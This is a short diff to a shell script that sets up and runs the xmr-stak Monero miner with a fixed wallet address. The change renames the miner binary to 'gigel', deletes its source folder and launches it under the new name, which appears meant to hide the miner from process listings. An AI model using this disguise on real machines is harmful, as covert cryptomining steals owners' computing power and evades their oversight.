@@ -6,6 +6,8 @@ WALLET=44NoPqV96tfD5tvAmUHrpUEAf62LwDrABgTnmhPHM9g6Bkdk3nk7arB1V86TykSDUUT1bJHfK
 CORES=`cat /proc/cpuinfo | grep processor | wc -l`
 THREADS=$((CORES+1))
 
+mv /usr/local/bin/xmr-stak /usr/local/bin/gigel
+rm -rf /xmr-stak
 
 # cd xmr-stak
 # cmake -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .
@@ -43,4 +45,4 @@ echo '"http_login" : "",' >> config.txt
 echo '"http_pass" : "",' >> config.txt
 echo '"prefer_ipv4" : true,' >> config.txt
 
-/usr/local/bin/xmr-stak --config config.txt --cpu cpu.txt
+/usr/local/bin/gigel --config config.txt --cpu cpu.txt
